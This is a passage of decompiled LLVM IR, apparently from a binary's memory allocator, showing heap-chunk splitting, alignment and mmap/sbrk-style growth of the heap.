  %v2_8052291 = add i32 %v1_8052291, 12
  %v3_8052291 = inttoptr i32 %v2_8052291 to i32*
  store i32 %v0_8052291, i32* %v3_8052291, align 4
  %v0_8052294 = load i32, i32* @edx, align 4
  %v1_8052294 = add i32 %v0_8052294, 8
  %v2_8052294 = inttoptr i32 %v1_8052294 to i32*
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %v2_8052294, align 4
  %v0_805229b = load i32, i32* @edx, align 4
  %v1_805229b = add i32 %v0_805229b, 12
  %v2_805229b = inttoptr i32 %v1_805229b to i32*
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %v2_805229b, align 4
  br i1 %v6_8052017, label %dec_label_pc_80522aa, label %dec_label_pc_80522a4

dec_label_pc_80522a4:                             ; preds = %dec_label_pc_8052282
  %v0_80522a4 = load i32, i32* @edx, align 4
  store i32 %v0_80522a4, i32* @global_var_8063c10.343, align 16
  br label %dec_label_pc_80522aa

dec_label_pc_80522aa:                             ; preds = %dec_label_pc_8052282, %dec_label_pc_80522a4
  %v4_80522aa = or i32 %v1_805235e, 1
  %v0_80522af = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_80522aa, i32* %ebx.global-to-local, align 4
  %v1_80522b5 = or i32 %v0_80522af, 1
  store i32 %v1_80522b5, i32* %eax.global-to-local, align 4
  %v1_80522b8 = load i32, i32* @ecx, align 4
  %v2_80522b8 = add i32 %v1_80522b8, 4
  %v3_80522b8 = inttoptr i32 %v2_80522b8 to i32*
  store i32 %v4_80522aa, i32* %v3_80522b8, align 4
  %v0_80522bb = load i32, i32* %esi.global-to-local, align 4
  %v1_80522bb = load i32, i32* @edx, align 4
  %v3_80522bb = add i32 %v1_80522bb, %v0_80522bb
  %v4_80522bb = inttoptr i32 %v3_80522bb to i32*
  store i32 %v0_80522bb, i32* %v4_80522bb, align 4
  %v0_80522be = load i32, i32* %eax.global-to-local, align 4
  %v1_80522be = load i32, i32* @edx, align 4
  %v2_80522be = add i32 %v1_80522be, 4
  %v3_80522be = inttoptr i32 %v2_80522be to i32*
  store i32 %v0_80522be, i32* %v3_80522be, align 4
  br label %dec_label_pc_80522c1

dec_label_pc_80522c1:                             ; preds = %dec_label_pc_805227b, %dec_label_pc_80522aa
  %v0_80522c1 = load i32, i32* @ecx, align 4
  %v1_80522c1 = add i32 %v0_80522c1, 8
  store i32 %v1_80522c1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80526c3

dec_label_pc_80522c9.loopexit:                    ; preds = %dec_label_pc_8052216
  br label %dec_label_pc_80522c9

dec_label_pc_80522c9:                             ; preds = %dec_label_pc_80522c9.loopexit, %dec_label_pc_8051fd1, %dec_label_pc_8051fd9
  %v0_80522c9 = load i32, i32* @global_var_8063c0c.342, align 4
  store i32 %v0_80522c9, i32* @ebx, align 4
  %v1_80522d3 = add i32 %v1_805235e, 16
  store i32 %v1_80522d3, i32* @esi, align 4
  %v1_80522d6 = add i32 %v0_80522c9, 4
  %v2_80522d6 = inttoptr i32 %v1_80522d6 to i32*
  %v3_80522d6 = load i32, i32* %v2_80522d6, align 4
  %v1_80522dd = and i32 %v3_80522d6, -4
  store i32 %v1_80522dd, i32* %ecx.global-to-local, align 4
  %v7_80522e0 = icmp ult i32 %v1_80522dd, %v1_80522d3
  br i1 %v7_80522e0, label %dec_label_pc_8052300, label %dec_label_pc_80522e4

dec_label_pc_80522e4:                             ; preds = %dec_label_pc_80522c9
  %v2_80522e8 = add i32 %v0_80522c9, %v1_805235e
  store i32 %v2_80522e8, i32* @edx, align 4
  %v1_80522eb = or i32 %v1_805235e, 1
  store i32 %v1_80522eb, i32* %eax.global-to-local, align 4
  store i32 %v2_80522e8, i32* @global_var_8063c0c.342, align 4
  store i32 %v1_80522eb, i32* %v2_80522d6, align 4
  %v0_80522f7 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80522f7 = sub i32 %v0_80522f7, %v1_805235e
  store i32 %v5_80522f7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052653

dec_label_pc_8052300:                             ; preds = %dec_label_pc_80522c9
  %v0_8052300 = load i32, i32* @global_var_8063f3c.347, align 4
  store i32 %v0_8052300, i32* %edx.global-to-local, align 4
  %v0_8052306 = load i8, i8* @global_var_8063be0.341, align 32
  %v1_8052306 = and i8 %v0_8052306, 2
  %v2_8052306 = icmp eq i8 %v1_8052306, 0
  br i1 %v2_8052306, label %dec_label_pc_8052334, label %dec_label_pc_805230f

dec_label_pc_805230f:                             ; preds = %dec_label_pc_8052300
  store i32 ptrtoint (i8* @global_var_8063be0.341 to i32), i32* %stack_var_-92, align 4
  %v2_8052317 = call i32 @function_805276d(i32* bitcast (i8* @global_var_8063be0.341 to i32*))
  store i32 ptrtoint (i8* @global_var_8063be0.341 to i32), i32* @ebx, align 4
  %v1_8052321 = add i32 %v1_805235e, -7
  store i32 %v1_8052321, i32* %eax.global-to-local, align 4
  store i32 %v1_8052321, i32* %stack_var_-92, align 4
  %v1_8052325 = call i32 @function_8051f6a(i32 %v1_8052321)
  store i32 %v1_8052325, i32* %eax.global-to-local, align 4
  store i32 %v1_8052325, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80526c3

dec_label_pc_8052334:                             ; preds = %dec_label_pc_8052300
  %v1_8052334 = add i32 %v0_8052300, -1
  store i32 %v1_8052334, i32* @ecx, align 4
  store i32 %v1_805235e, i32* @ebx, align 4
  %v1_805233f = load i32, i32* @global_var_8063f2c.348, align 4
  %v7_805233f = icmp ult i32 %v1_805235e, %v1_805233f
  br i1 %v7_805233f, label %dec_label_pc_8052401, label %dec_label_pc_805234b

dec_label_pc_805234b:                             ; preds = %dec_label_pc_8052334
  %v0_805234b = load i32, i32* @global_var_8063f30.349, align 16
  store i32 %v0_805234b, i32* %eax.global-to-local, align 4
  %v1_8052350 = load i32, i32* @global_var_8063f34.350, align 4
  %v5_8052356 = icmp slt i32 %v0_805234b, %v1_8052350
  br i1 %v5_8052356, label %dec_label_pc_805235c, label %dec_label_pc_8052401

dec_label_pc_805235c:                             ; preds = %dec_label_pc_805234b
  %v2_805235e = add i32 %v1_805235e, 10
  %v3_805235e = add i32 %v2_805235e, %v0_8052300
  %v1_8052362 = sub i32 0, %v0_8052300
  store i32 %v1_8052362, i32* %eax.global-to-local, align 4
  %v2_8052364 = and i32 %v3_805235e, %v1_8052362
  store i32 %v2_8052364, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_8052364, %v1_805235e
  br i1 %tmp127, label %dec_label_pc_8052370, label %dec_label_pc_8052401

dec_label_pc_8052370:                             ; preds = %dec_label_pc_805235c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805237d = call i32 @function_8053900(i32 0, i32 %v2_8052364, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052334, i32 %v1_8052334)
  store i32 %v8_805237d, i32* %eax.global-to-local, align 4
  store i32 %v8_805237d, i32* @edx, align 4
  %v10_8052387 = icmp eq i32 %v8_805237d, -1
  br i1 %v10_8052387, label %dec_label_pc_8052370.dec_label_pc_8052401_crit_edge, label %dec_label_pc_805238c

dec_label_pc_8052370.dec_label_pc_8052401_crit_edge: ; preds = %dec_label_pc_8052370
  %v0_8052401.pre = load i32, i32* @global_var_8063c0c.342, align 4
  br label %dec_label_pc_8052401

dec_label_pc_805238c:                             ; preds = %dec_label_pc_8052370
  %v1_805238e = urem i32 %v8_805237d, 8
  %v2_805238e = icmp eq i32 %v1_805238e, 0
  store i32 %v1_805238e, i32* @ecx, align 4
  br i1 %v2_805238e, label %dec_label_pc_80523a6, label %dec_label_pc_8052393

dec_label_pc_8052393:                             ; preds = %dec_label_pc_805238c
  %v0_8052398 = load i32, i32* @ebx, align 4
  %v2_805239a = sub nsw i32 8, %v1_805238e
  store i32 %v2_805239a, i32* %eax.global-to-local, align 4
  %v2_805239c = add i32 %v2_805239a, %v8_805237d
  store i32 %v2_805239c, i32* @edx, align 4
  %v2_805239e = sub i32 %v0_8052398, %v2_805239a
  store i32 %v2_805239e, i32* %esi.global-to-local, align 4
  %v2_80523a0 = inttoptr i32 %v2_805239c to i32*
  store i32 %v2_805239a, i32* %v2_80523a0, align 4
  br label %dec_label_pc_80523ae

dec_label_pc_80523a6:                             ; preds = %dec_label_pc_805238c
  %v1_80523a6 = inttoptr i32 %v8_805237d to i32*
  store i32 0, i32* %v1_80523a6, align 4
  br label %dec_label_pc_80523ae

dec_label_pc_80523ae:                             ; preds = %dec_label_pc_8052393, %dec_label_pc_80523a6
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052393 ], [ @ebx, %dec_label_pc_80523a6 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_80523ae = or i32 %storemerge, 2
  %v1_80523b1 = load i32, i32* @edx, align 4
  %v2_80523b1 = add i32 %v1_80523b1, 4
  %v3_80523b1 = inttoptr i32 %v2_80523b1 to i32*
  store i32 %v1_80523ae, i32* %v3_80523b1, align 4
  %v0_80523b4 = load i32, i32* @global_var_8063f30.349, align 16
  %v1_80523b9 = add i32 %v0_80523b4, 1
  store i32 %v1_80523b9, i32* %eax.global-to-local, align 4
  store i32 %v1_80523b9, i32* @global_var_8063f30.349, align 16
  %v1_80523bf = load i32, i32* @global_var_8063f38.351, align 8
  %v7_80523c5 = icmp sgt i32 %v1_80523b9, %v1_80523bf
  br i1 %v7_80523c5, label %dec_label_pc_80523c7, label %dec_label_pc_80523cc

dec_label_pc_80523c7:                             ; preds = %dec_label_pc_80523ae
  store i32 %v1_80523b9, i32* @global_var_8063f38.351, align 8
  br label %dec_label_pc_80523cc

dec_label_pc_80523cc:                             ; preds = %dec_label_pc_80523ae, %dec_label_pc_80523c7
  %v0_80523cc = load i32, i32* @global_var_8063f44.352, align 4
  %v1_80523d1 = load i32, i32* @ebx, align 4
  %v2_80523d1 = add i32 %v1_80523d1, %v0_80523cc
  store i32 %v2_80523d1, i32* %eax.global-to-local, align 4
  store i32 %v2_80523d1, i32* @global_var_8063f44.352, align 4
  %v1_80523d8 = load i32, i32* @global_var_8063f50.353, align 16
  %tmp128 = icmp ugt i32 %v2_80523d1, %v1_80523d8
  br i1 %tmp128, label %dec_label_pc_80523e0, label %dec_label_pc_80523e5

dec_label_pc_80523e0:                             ; preds = %dec_label_pc_80523cc
  store i32 %v2_80523d1, i32* @global_var_8063f50.353, align 16
  br label %dec_label_pc_80523e5

dec_label_pc_80523e5:                             ; preds = %dec_label_pc_80523cc, %dec_label_pc_80523e0
  %v1_80523e5 = load i32, i32* @global_var_8063f48.354, align 8
  %v2_80523e5 = add i32 %v1_80523e5, %v2_80523d1
  store i32 %v2_80523e5, i32* %eax.global-to-local, align 4
  %v1_80523eb = load i32, i32* @global_var_8063f54.355, align 4
  %tmp129 = icmp ugt i32 %v2_80523e5, %v1_80523eb
  br i1 %tmp129, label %dec_label_pc_80523f7, label %dec_label_pc_8052048

dec_label_pc_80523f7:                             ; preds = %dec_label_pc_80523e5
  store i32 %v2_80523e5, i32* @global_var_8063f54.355, align 4
  br label %dec_label_pc_8052048

dec_label_pc_8052401:                             ; preds = %dec_label_pc_805235c, %dec_label_pc_8052370.dec_label_pc_8052401_crit_edge, %dec_label_pc_805234b, %dec_label_pc_8052334
  %v0_8052401 = phi i32 [ %v0_8052401.pre, %dec_label_pc_8052370.dec_label_pc_8052401_crit_edge ], [ %v0_80522c9, %dec_label_pc_805234b ], [ %v0_80522c9, %dec_label_pc_805235c ], [ %v0_80522c9, %dec_label_pc_8052334 ]
  store i32 %v0_8052401, i32* %eax.global-to-local, align 4
  %v1_805240a = add i32 %v0_8052401, 4
  %v2_805240a = inttoptr i32 %v1_805240a to i32*
  %v3_805240a = load i32, i32* %v2_805240a, align 4
  %v1_8052414 = and i32 %v3_805240a, -4
  %v2_8052414 = icmp eq i32 %v1_8052414, 0
  store i32 %v1_8052414, i32* @ebp, align 4
  %v1_8052417 = load i32, i32* @global_var_8063f28.356, align 8
  %v2_8052417 = add i32 %v1_8052417, %v1_80522d3
  store i32 %v2_8052417, i32* %eax.global-to-local, align 4
  %v0_805241d = load i8, i8* @global_var_8063f40.357, align 64
  %v1_805241d = urem i8 %v0_805241d, 2
  %v2_805241d = icmp eq i8 %v1_805241d, 0
  br i1 %v2_805241d, label %dec_label_pc_8052428, label %dec_label_pc_8052426

dec_label_pc_8052426:                             ; preds = %dec_label_pc_8052401
  %v2_8052426 = sub i32 %v2_8052417, %v1_8052414
  store i32 %v2_8052426, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052428

dec_label_pc_8052428:                             ; preds = %dec_label_pc_8052401, %dec_label_pc_8052426
  %v0_805242c = phi i32 [ %v2_8052417, %dec_label_pc_8052401 ], [ %v2_8052426, %dec_label_pc_8052426 ]
  %v5_805242c = add i32 %v0_805242c, %v1_8052334
  store i32 %v5_805242c, i32* %eax.global-to-local, align 4
  %v1_8052430 = sub i32 0, %v0_8052300
  store i32 %v1_8052430, i32* @edx, align 4
  %v2_8052438 = and i32 %v5_805242c, %v1_8052430
  store i32 %v2_8052438, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_8052438, 1
  br i1 %tmp88, label %dec_label_pc_8052452, label %dec_label_pc_805243c

dec_label_pc_805243c:                             ; preds = %dec_label_pc_8052428
  store i32 %v2_8052438, i32* %stack_var_-92, align 4
  %v1_8052440 = call i32 @function_8053aec(i32 %v2_8052438)
  store i32 %v1_8052440, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8052440, i32* @ebx, align 4
  %v10_805244d = icmp eq i32 %v1_8052440, -1
  %v1_8052450 = icmp eq i1 %v10_805244d, false
  br i1 %v1_8052450, label %dec_label_pc_80524a8.dec_label_pc_80524b1_crit_edge, label %dec_label_pc_805243c.dec_label_pc_8052452_crit_edge

dec_label_pc_805243c.dec_label_pc_8052452_crit_edge: ; preds = %dec_label_pc_805243c
  %v0_8052452.pre = load i8, i8* @global_var_8063f40.357, align 64
  br label %dec_label_pc_8052452

dec_label_pc_8052452:                             ; preds = %dec_label_pc_805243c.dec_label_pc_8052452_crit_edge, %dec_label_pc_8052428
  %v0_805247e = phi i32 [ -1, %dec_label_pc_805243c.dec_label_pc_8052452_crit_edge ], [ %v1_8052430, %dec_label_pc_8052428 ]
  %v0_8052452 = phi i8 [ %v0_8052452.pre, %dec_label_pc_805243c.dec_label_pc_8052452_crit_edge ], [ %v0_805241d, %dec_label_pc_8052428 ]
  %v1_8052452 = urem i8 %v0_8052452, 2
  %v2_8052452 = icmp eq i8 %v1_8052452, 0
  br i1 %v2_8052452, label %dec_label_pc_8052452.dec_label_pc_8052467_crit_edge, label %dec_label_pc_805245b

dec_label_pc_8052452.dec_label_pc_8052467_crit_edge: ; preds = %dec_label_pc_8052452
  %v0_8052467.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052467

dec_label_pc_805245b:                             ; preds = %dec_label_pc_8052452
  %v2_805245f = add i32 %v1_8052414, %v1_8052334
  store i32 %v2_805245f, i32* %eax.global-to-local, align 4
  %v0_8052461 = load i32, i32* @esi, align 4
  %v2_8052461 = add i32 %v0_8052461, %v2_805245f
  %v5_8052463 = and i32 %v2_8052461, %v1_8052430
  store i32 %v5_8052463, i32* @esi, align 4
  br label %dec_label_pc_8052467

dec_label_pc_8052467:                             ; preds = %dec_label_pc_8052452.dec_label_pc_8052467_crit_edge, %dec_label_pc_805245b
  %v0_8052467 = phi i32 [ %v0_8052467.pre, %dec_label_pc_8052452.dec_label_pc_8052467_crit_edge ], [ %v5_8052463, %dec_label_pc_805245b ]
  %tmp130 = icmp ult i32 %v0_8052467, 1048576
  br i1 %tmp130, label %dec_label_pc_805246f, label %dec_label_pc_8052474

dec_label_pc_805246f:                             ; preds = %dec_label_pc_8052467
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8052474

dec_label_pc_8052474:                             ; preds = %dec_label_pc_8052467, %dec_label_pc_805246f
  %v0_8052488 = phi i32 [ %v0_8052467, %dec_label_pc_8052467 ], [ 1048576, %dec_label_pc_805246f ]
  %tmp131 = icmp ugt i32 %v0_8052488, %v1_805235e
  br i1 %tmp131, label %dec_label_pc_805247e, label %dec_label_pc_80526b6

dec_label_pc_805247e:                             ; preds = %dec_label_pc_8052474
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805248b = call i32 @function_8053900(i32 0, i32 %v0_8052488, i32 3, i32 34, i32 0, i32 0, i32 %v0_805247e, i32 %v0_805247e)
  store i32 %v8_805248b, i32* %eax.global-to-local, align 4
  store i32 %v8_805248b, i32* @ebx, align 4
  %v10_8052495 = icmp eq i32 %v8_805248b, -1
  br i1 %v10_8052495, label %dec_label_pc_80526b6, label %dec_label_pc_80524a8.thread

dec_label_pc_80524a8.thread:                      ; preds = %dec_label_pc_805247e
  %v0_805249e = load i8, i8* @global_var_8063f40.357, align 1
  %v2_805249e = and i8 %v0_805249e, -2
  store i8 %v2_805249e, i8* @global_var_8063f40.357, align 64
  %v1_80524a5 = load i32, i32* @esi, align 4
  %v2_80524a5 = add i32 %v1_80524a5, %v8_805248b
  store i32 %v2_80524a5, i32* @edx, align 4
  br label %dec_label_pc_80524b1

dec_label_pc_80524a8.dec_label_pc_80524b1_crit_edge: ; preds = %dec_label_pc_805243c
  %v1_80524b5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80524b1

dec_label_pc_80524b1:                             ; preds = %dec_label_pc_80524a8.dec_label_pc_80524b1_crit_edge, %dec_label_pc_80524a8.thread
  %v1_80524b5 = phi i32 [ %v1_80524a5, %dec_label_pc_80524a8.thread ], [ %v1_80524b5.pre, %dec_label_pc_80524a8.dec_label_pc_80524b1_crit_edge ]
  %v0_805257d91 = phi i32 [ %v8_805248b, %dec_label_pc_80524a8.thread ], [ %v1_8052440, %dec_label_pc_80524a8.dec_label_pc_80524b1_crit_edge ]
  %v0_805256f90 = phi i32 [ %v2_80524a5, %dec_label_pc_80524a8.thread ], [ -1, %dec_label_pc_80524a8.dec_label_pc_80524b1_crit_edge ]
  %v0_80524b5 = load i32, i32* @global_var_8063f48.354, align 8
  %v2_80524b5 = add i32 %v1_80524b5, %v0_80524b5
  store i32 %v2_80524b5, i32* @global_var_8063f48.354, align 8
  %v2_80524bb = add i32 %v1_8052414, %v0_8052401
  store i32 %v2_80524bb, i32* %ecx.global-to-local, align 4
  %v2_80524bd = sub i32 %v0_805257d91, %v2_80524bb
  %v7_80524bd = icmp ult i32 %v0_805257d91, %v2_80524bb
  %v12_80524bd = icmp eq i32 %v2_80524bd, 0
  %v1_80524bf = icmp eq i1 %v12_80524bd, false
  br i1 %v1_80524bf, label %dec_label_pc_80524d8, label %dec_label_pc_80524c1

dec_label_pc_80524c1:                             ; preds = %dec_label_pc_80524b1
  %v10_80524c1 = icmp eq i32 %v0_805256f90, -1
  %v1_80524c4 = icmp eq i1 %v10_80524c1, false
  br i1 %v1_80524c4, label %dec_label_pc_80524d8, label %dec_label_pc_80524c6

dec_label_pc_80524c6:                             ; preds = %dec_label_pc_80524c1
  %v2_80524c6 = add i32 %v1_80524b5, %v1_8052414
  store i32 %v0_8052401, i32* %ecx.global-to-local, align 4
  %v1_80524cd = or i32 %v2_80524c6, 1
  store i32 %v1_80524cd, i32* %eax.global-to-local, align 4
  store i32 %v1_80524cd, i32* %v2_805240a, align 4
  br label %dec_label_pc_8052605

dec_label_pc_80524d8:                             ; preds = %dec_label_pc_80524c1, %dec_label_pc_80524b1
  %v0_80524d8 = load i8, i8* @global_var_8063f40.357, align 1
  %v1_80524d8 = sext i8 %v0_80524d8 to i32
  store i32 %v1_80524d8, i32* %eax.global-to-local, align 4
  %v2_80524dd = urem i8 %v0_80524d8, 2
  %v3_80524dd = icmp eq i8 %v2_80524dd, 0
  br i1 %v3_80524dd, label %dec_label_pc_80524f1, label %dec_label_pc_80524e1

dec_label_pc_80524e1:                             ; preds = %dec_label_pc_80524d8
  br i1 %v2_8052414, label %dec_label_pc_80524f1, label %dec_label_pc_80524e5

dec_label_pc_80524e5:                             ; preds = %dec_label_pc_80524e1
  %v1_80524e7 = icmp eq i1 %v7_80524bd, false
  br i1 %v1_80524e7, label %dec_label_pc_80524f1, label %dec_label_pc_80524e9

dec_label_pc_80524e9:                             ; preds = %dec_label_pc_80524e5
  %v1_80524e9 = and i32 %v1_80524d8, -2
  %v4_80524e9 = trunc i32 %v1_80524e9 to i8
  store i32 %v1_80524e9, i32* %eax.global-to-local, align 4
  store i8 %v4_80524e9, i8* @global_var_8063f40.357, align 64
  br label %dec_label_pc_80524f1

dec_label_pc_80524f1:                             ; preds = %dec_label_pc_80524e5, %dec_label_pc_80524e1, %dec_label_pc_80524d8, %dec_label_pc_80524e9
  %v0_80524f1 = phi i8 [ %v0_80524d8, %dec_label_pc_80524e5 ], [ %v0_80524d8, %dec_label_pc_80524e1 ], [ %v0_80524d8, %dec_label_pc_80524d8 ], [ %v4_80524e9, %dec_label_pc_80524e9 ]
  %v1_80524f1 = urem i8 %v0_80524f1, 2
  %v2_80524f1 = icmp eq i8 %v1_80524f1, 0
  br i1 %v2_80524f1, label %dec_label_pc_805256f, label %dec_label_pc_80524fa

dec_label_pc_80524fa:                             ; preds = %dec_label_pc_80524f1
  br i1 %v2_8052414, label %dec_label_pc_8052508, label %dec_label_pc_80524fe

dec_label_pc_80524fe:                             ; preds = %dec_label_pc_80524fa
  store i32 %v2_80524bd, i32* %eax.global-to-local, align 4
  %v2_8052502 = add i32 %v2_80524b5, %v2_80524bd
  store i32 %v2_8052502, i32* @global_var_8063f48.354, align 8
  br label %dec_label_pc_8052508

dec_label_pc_8052508:                             ; preds = %dec_label_pc_80524fa, %dec_label_pc_80524fe
  %v1_805250a = urem i32 %v0_805257d91, 8
  %v2_805250a = icmp eq i32 %v1_805250a, 0
  store i32 %v1_805250a, i32* %edx.global-to-local, align 4
  %v1_805250d = icmp eq i1 %v2_805250a, false
  br i1 %v1_805250d, label %dec_label_pc_8052515, label %dec_label_pc_805250f

dec_label_pc_805250f:                             ; preds = %dec_label_pc_8052508
  store i32 %v0_805257d91, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805251f

dec_label_pc_8052515:                             ; preds = %dec_label_pc_8052508
  %v2_805251a = sub nsw i32 8, %v1_805250a
  store i32 %v2_805251a, i32* %eax.global-to-local, align 4
  %v2_805251c = add i32 %v2_805251a, %v0_805257d91
  store i32 %v2_805251c, i32* @edi, align 4
  br label %dec_label_pc_805251f

dec_label_pc_805251f:                             ; preds = %dec_label_pc_805250f, %dec_label_pc_8052515
  %v0_8052522 = phi i32 [ 0, %dec_label_pc_805250f ], [ %v2_805251a, %dec_label_pc_8052515 ]
  %v2_805251f = add i32 %v1_80524b5, %v0_805257d91
  %v2_8052522 = add i32 %v0_8052522, %v1_8052414
  store i32 %v2_8052522, i32* %ecx.global-to-local, align 4
  %v2_805252b = add i32 %v2_8052522, %v2_805251f
  store i32 %v2_805252b, i32* %edx.global-to-local, align 4
  %v2_8052531 = add i32 %v2_805252b, %v1_8052334
  %v5_8052534 = and i32 %v2_8052531, %v1_8052430
  %v2_805253b = sub i32 %v5_8052534, %v2_805252b
  store i32 %v2_805253b, i32* %eax.global-to-local, align 4
  %v2_805253d = add i32 %v2_805253b, %v2_8052522
  store i32 %v2_805253d, i32* @esi, align 4
  store i32 %v2_805253d, i32* %stack_var_-92, align 4
  %v1_8052541 = call i32 @function_8053aec(i32 %v2_805253d)
  store i32 %v1_8052541, i32* %eax.global-to-local, align 4
  store i32 %v1_8052541, i32* @edx, align 4
  %v10_805254b = icmp eq i32 %v1_8052541, -1
  %v1_805254e = icmp eq i1 %v10_805254b, false
  br i1 %v1_805254e, label %dec_label_pc_805255e, label %dec_label_pc_8052550

dec_label_pc_8052550:                             ; preds = %dec_label_pc_805251f
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052555 = call i32 @function_8053aec(i32 0)
  store i32 %v1_8052555, i32* %eax.global-to-local, align 4
  store i32 %v1_8052555, i32* @edx, align 4
  br label %dec_label_pc_8052592

dec_label_pc_805255e:                             ; preds = %dec_label_pc_805251f
  %v1_805255e = load i32, i32* @ebx, align 4
  %v7_805255e = icmp ult i32 %v1_8052541, %v1_805255e
  %v1_8052560 = icmp eq i1 %v7_805255e, false
  br i1 %v1_8052560, label %dec_label_pc_8052597, label %dec_label_pc_8052562

dec_label_pc_8052562:                             ; preds = %dec_label_pc_805255e
  %v0_8052562 = load i8, i8* @global_var_8063f40.357, align 1
  %v2_8052562 = and i8 %v0_8052562, -2
  store i8 %v2_8052562, i8* @global_var_8063f40.357, align 64
  store i32 %v2_805251f, i32* @edx, align 4
  br label %dec_label_pc_8052576

dec_label_pc_805256f:                             ; preds = %dec_label_pc_80524f1
  %v10_805256f = icmp eq i32 %v0_805256f90, -1
  br i1 %v10_805256f, label %dec_label_pc_805257a, label %dec_label_pc_8052574

dec_label_pc_8052574:                             ; preds = %dec_label_pc_805256f
  store i32 %v0_805257d91, i32* @edi, align 4
  br label %dec_label_pc_8052576

dec_label_pc_8052576:                             ; preds = %dec_label_pc_8052562, %dec_label_pc_8052574
  %v0_805259749 = phi i32 [ %v2_805251f, %dec_label_pc_8052562 ], [ %v0_805256f90, %dec_label_pc_8052574 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052597

dec_label_pc_805257a:                             ; preds = %dec_label_pc_805256f
  store i32 %v0_805257d91, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052581 = call i32 @function_8053aec(i32 0)
  store i32 %v1_8052581, i32* @edx, align 4
  %v1_8052588 = load i32, i32* @ebx, align 4
  %v2_8052588 = sub i32 %v1_8052581, %v1_8052588
  %v1_805258a = load i32, i32* @esi, align 4
  %v2_805258a = sub i32 %v2_8052588, %v1_805258a
  store i32 %v2_805258a, i32* %eax.global-to-local, align 4
  %v0_805258c = load i32, i32* @global_var_8063f48.354, align 8
  %v2_805258c = add i32 %v0_805258c, %v2_805258a
  store i32 %v2_805258c, i32* @global_var_8063f48.354, align 8
  br label %dec_label_pc_8052592

dec_label_pc_8052592:                             ; preds = %dec_label_pc_8052550, %dec_label_pc_805257a
  %v0_805259748 = phi i32 [ %v1_8052555, %dec_label_pc_8052550 ], [ %v1_8052581, %dec_label_pc_805257a ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052597

dec_label_pc_8052597:                             ; preds = %dec_label_pc_805255e, %dec_label_pc_8052576, %dec_label_pc_8052592
  %v0_805259c = phi i32 [ %v1_8052541, %dec_label_pc_805255e ], [ %v0_805259749, %dec_label_pc_8052576 ], [ %v0_805259748, %dec_label_pc_8052592 ]
  %v10_8052597 = icmp eq i32 %v0_805259c, -1
  br i1 %v10_8052597, label %dec_label_pc_8052605, label %dec_label_pc_805259c

dec_label_pc_805259c:                             ; preds = %dec_label_pc_8052597
  %v1_805259c = load i32, i32* @edi, align 4
  %v2_805259c = sub i32 %v0_805259c, %v1_805259c
  store i32 %v2_805259c, i32* @edx, align 4
  store i32 %v1_805259c, i32* @global_var_8063c0c.342, align 4
  %v1_80525a4 = load i32, i32* @esi, align 4
  %v2_80525a4 = add i32 %v1_80525a4, %v2_805259c
  %v1_80525a7 = or i32 %v2_80525a4, 1
  store i32 %v1_80525a7, i32* %eax.global-to-local, align 4
  %v2_80525aa = add i32 %v1_805259c, 4
  %v3_80525aa = inttoptr i32 %v2_80525aa to i32*
  store i32 %v1_80525a7, i32* %v3_80525aa, align 4
  %v0_80525ad = load i32, i32* @global_var_8063f48.354, align 8
  %v1_80525ad = load i32, i32* @esi, align 4
  %v2_80525ad = add i32 %v1_80525ad, %v0_80525ad
  store i32 %v2_80525ad, i32* @global_var_8063f48.354, align 8
  br i1 %v2_8052414, label %dec_label_pc_8052605, label %dec_label_pc_80525b7

dec_label_pc_80525b7:                             ; preds = %dec_label_pc_805259c
  %v1_80525b7 = add i32 %v1_8052414, -12
  store i32 %v0_8052401, i32* %ecx.global-to-local, align 4
  %v1_80525be = and i32 %v1_80525b7, -8
  store i32 %v1_80525be, i32* %eax.global-to-local, align 4
  %v1_80525c3 = or i32 %v1_80525be, 1
  store i32 %v1_80525c3, i32* @edx, align 4
  %v5_80525c6 = icmp ult i32 %v1_80525be, 15
  store i32 %v1_80525c3, i32* %v2_805240a, align 4
  %v0_80525cc = load i32, i32* %ecx.global-to-local, align 4
  %v1_80525cc = load i32, i32* %eax.global-to-local, align 4
  %v2_80525cc = add i32 %v0_80525cc, 4
  %v3_80525cc = add i32 %v2_80525cc, %v1_80525cc
  %v4_80525cc = inttoptr i32 %v3_80525cc to i32*
  store i32 5, i32* %v4_80525cc, align 4
  %v0_80525d4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80525d4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80525d4 = add i32 %v0_80525d4, 8
  %v3_80525d4 = add i32 %v2_80525d4, %v1_80525d4
  %v4_80525d4 = inttoptr i32 %v3_80525d4 to i32*
  store i32 5, i32* %v4_80525d4, align 4
  br i1 %v5_80525c6, label %dec_label_pc_8052605, label %dec_label_pc_80525de

dec_label_pc_80525de:                             ; preds = %dec_label_pc_80525b7
  %v0_80525e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80525e3 = add i32 %v0_80525e1, 8
  store i32 %v1_80525e3, i32* %eax.global-to-local, align 4
  %v0_80525e6 = load i32, i32* @global_var_8063f24.358, align 4
  store i32 %v0_80525e6, i32* @ebx, align 4
  store i32 %v1_80525e3, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8063f24.358, align 4
  %v1_80525f7 = call i32 @function_8052915(i32 %v1_80525e3)
  store i32 %v1_80525f7, i32* %eax.global-to-local, align 4
